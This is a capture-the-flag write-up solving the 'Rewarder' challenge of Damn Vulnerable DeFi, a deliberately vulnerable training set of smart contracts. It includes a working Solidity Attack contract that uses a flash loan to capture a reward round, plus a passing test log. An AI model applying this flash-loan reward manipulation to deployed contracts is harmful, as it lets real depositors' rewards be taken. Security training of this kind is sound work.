# Damn Vulnerable DeFi (Foundry version)

- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

## Challenge #5 - The rewarder - Description

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

## Scope

| File Name                                                                   | SHA-1 Hash                               |
| --------------------------------------------------------------------------- | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/AccountingToken.sol | 5cc4fc8b8a94843f2b1be925745213c3cd9e7ff5 |
| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/FlashLoanerPool.sol | a1651046810d5419b9a2f16aab6d3cb8034e9a29 |
| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/RewardToken.sol     | b679fb4633357d6f762374af9bce554076ac57a1 |
| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/TheRewarderPool.sol | 20bc3fb225e1fe7e67f74521a4ea01d4956472ac |

## Plan

The description contains already a hint. Most probably we will have to take a flash loan after the current round and claim most/all the rewards for us.

## Solution

<details>
    <summary>Description</summary>

In function `flashLoan()` of `FlashLoanerPool` there is a check that the [borrower must be a contract](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/the-rewarder/FlashLoanerPool.sol#L29) and we will have to implement our own [receiveFlashLoan](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/the-rewarder/FlashLoanerPool.sol#L33).

1.  We fast-forward 5 days.
2.  Call `flashLoan` with `TOKENS_IN_LENDER_POOL` from our `Attack` contract.
3.  `deposit` to `theRewarderPool` to trigger also the `distributeRewards`.
4.  `withdraw` to pay back the loan as we have already claimed our rewards.
5.  `transfer` the rewards to us.

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/the-rewarder/TheRewarder.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT);
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.warp(block.timestamp + 5 days);
        vm.prank(attacker);
        Attack attack = new Attack(flashLoanerPool, theRewarderPool, dvt, attacker);
        attack.pwn();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}

contract Attack {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;

    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal dvt;
    address attacker;

    constructor(
        FlashLoanerPool _flashLoanerPool,
        TheRewarderPool _theRewarderPool,
        DamnValuableToken _dvt,
        address _attacker
    ) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        dvt = _dvt;
        attacker = _attacker;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        dvt.approve(address(theRewarderPool), borrowAmount);
        theRewarderPool.deposit(borrowAmount);
        theRewarderPool.withdraw(borrowAmount);
        dvt.transfer(address(flashLoanerPool), borrowAmount);
        uint256 rewardBalance = theRewarderPool.rewardToken().balanceOf(address(this));
        theRewarderPool.rewardToken().transfer(attacker, rewardBalance);
    }

    function pwn() external {
        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
    }
}
```

</details>

### Proof of Concept

```
./run.sh 5
[⠢] Compiling...
[⠰] Compiling 1 files with 0.8.17
[⠔] Solc 0.8.17 finished in 1.10s
Compiler run successful (with warnings)

Running 1 test for test/Levels/the-rewarder/TheRewarder.t.sol:TheRewarder
[PASS] testExploit() (gas: 911018)
Logs:
  🧨 Let's see if you can break it... 🧨

🎉 Congratulations, you can go to the next level! 🎉

Test result: ok. 1 passed; 0 failed; finished in 2.39ms
```
